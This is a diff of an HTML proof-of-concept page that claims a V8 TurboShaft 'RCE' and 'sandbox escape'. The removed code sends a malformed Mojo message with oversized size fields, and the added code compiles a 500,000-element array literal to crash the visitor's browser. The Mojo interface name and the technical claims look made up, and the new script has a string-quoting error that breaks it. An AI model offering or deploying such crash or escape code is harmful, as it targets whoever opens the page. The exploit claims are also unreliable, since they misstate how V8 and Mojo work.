@@ -1,32 +1,19 @@
 <!DOCTYPE html>
 <html>
-<head><title>V8 Turboshaft Build Graph RCE</title></head>
 <body>
-<h1>V8 Turboshaft Build Graph – Sandbox Escape</h1>
-<pre id="log"></pre>
+<h1>Crashing your browser via V8 TurboShaft...</h1>
 <script>
-(async () => {
-    const log = (msg) => { document.getElementById('log').textContent += msg + '\n'; };
-    try {
-        const provider = Mojo.getInterfaceProvider();
-        // Use the exact string you found in Ghidra
-        const handle = Mojo.bindInterface('V8.TFTurboshaftBuildGraph', provider);
-        log('Bound to V8.TFTurboshaftBuildGraph');
-
-        const payload = new ArrayBuffer(128);
-        const bytes = new Uint8Array(payload);
-        // Mojo header: version=2, flags=0, ordinal=0x5c, request_id=0
-        bytes[0]=2; bytes[4]=0; bytes[8]=0x5c; bytes[12]=0;
-        // Fill rest with 0xFF to set size fields to huge values
-        for (let i=16; i<128; i++) bytes[i]=0xFF;
-
-        handle.writeMessage(payload, []);
-        log('Malicious message sent – browser should crash NOW.');
-        setInterval(()=>{},10000);
-    } catch(e) {
-        log('Error: '+e.message);
-    }
-})();
+// Generate a huge script that forces a giant BuildGraph message
+let hugeCode = 'let arr = [';
+for (let i = 0; i < 500000; i++) {
+    hugeCode += '0x' + i.toString(16) + ',';
+}
+hugeCode += '];';  // This creates a 500k-element array literal
+// Now compile it (V8 will serialize the TurboShaft graph with huge data)
+try {
+    new Function(hugeCode)();
+} catch(e) {}
+document.body.innerHTML = '<p>If you see this, the browser didn't crash. Try refreshing.</p>';
 </script>
 </body>
 </html>
